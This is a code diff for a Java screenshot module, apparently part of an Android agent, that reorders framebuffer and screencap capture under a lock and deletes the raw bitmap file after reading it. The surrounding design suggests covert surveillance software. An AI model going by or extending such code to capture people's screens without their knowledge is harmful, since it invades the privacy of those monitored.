@@ -136,30 +136,33 @@ public class ModuleSnapshot extends BaseInstantModule {
 			return;
 		}
 
-		try {
-			if (!frameBufferMethod()) {
-				frameBuffer = false;
+		synchronized(Status.self().lockFramebuffer) {
+			try {
 				if (!screencapMethod()) {
 					screenCap = false;
-				}
-			}
+					if (!frameBufferMethod()) {
+						frameBuffer = false;
 
-			if(!frameBuffer && ! screenCap){
+					}
+				}
+
+				if (!frameBuffer && !screenCap) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (actualStart) Screenshot not supported");
+					}
+				}
+			} catch (final Exception ex) {
+				if (Cfg.EXCEPTION) {
+					Check.log(ex);
+				}
+
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (actualStart) Screenshot not supported");
+					Check.log(TAG + " (go) Error: " + ex);//$NON-NLS-1$
+					Check.log(ex);//$NON-NLS-1$
 				}
+			} finally {
+				working.release();
 			}
-		} catch (final Exception ex) {
-			if (Cfg.EXCEPTION) {
-				Check.log(ex);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go) Error: " + ex);//$NON-NLS-1$
-				Check.log(ex);//$NON-NLS-1$
-			}
-		} finally {
-			working.release();
 		}
 
 	}
@@ -481,8 +484,13 @@ public class ModuleSnapshot extends BaseInstantModule {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (getRawBitmap) file exists: " + file);
 				}
-				return file.read();
+
+				byte[] ret = file.read();
+
+				file.delete();
+				return ret;
 			}
+
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getRawBitmap) Error: " + e);
